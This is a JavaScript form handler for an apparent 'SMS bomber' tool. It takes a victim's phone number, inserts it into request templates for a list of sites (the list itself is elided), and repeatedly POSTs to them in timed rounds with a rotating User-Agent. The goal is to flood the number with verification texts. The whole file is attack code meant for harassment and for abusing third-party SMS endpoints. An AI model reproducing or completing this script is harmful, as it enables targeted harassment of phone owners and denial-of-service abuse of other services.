document.getElementById('smsForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const phoneNumber = document.getElementById('phoneNumber').value;
  const mood = document.getElementById('mood').value;

  const sites = [
    // ...
  ];

  const userAgents = [
    // ...
  ];

  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

  let rounds, delay, roundDelay;

  if (mood === '1') {
    rounds = 2;
    delay = 3500;
    roundDelay = 1000;
  } else if (mood === '2') {
    rounds = 3;
    delay = 500;
    roundDelay = 1000;
  } else {
    alert('Invalid mood. Please select Normal or Fast.');
    return;
  }

  const responseDiv = document.getElementById('response');
  responseDiv.innerHTML = '';

  for (let round = 0; round < rounds; round++) {
    for (const site of sites) {
      const url = site.url;
      const json = { ...site.json };

      // Replace "number" with "phoneNumber"
      Object.keys(json).forEach(key => {
        if (typeof json[key] === 'string') {
          json[key] = json[key].replace('number', phoneNumber);
        }
      });

      const headers = { 'User-Agent': userAgent };

      const startTime = Date.now();

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: headers,
          body: JSON.stringify(json)
        });

        const endTime = Date.now();
        const duration = endTime - startTime;

        const responseText = `Response from site ${site.site} in round ${round + 1}: ${response.status}`;
        const responseElement = document.createElement('p');
        responseElement.textContent = responseText;
        responseDiv.appendChild(responseElement);

        await new Promise(resolve => setTimeout(resolve, delay));
      } catch (error) {
        console.error('Error:', error);
      }
    }

    await new Promise(resolve => setTimeout(resolve, roundDelay));
  }
});
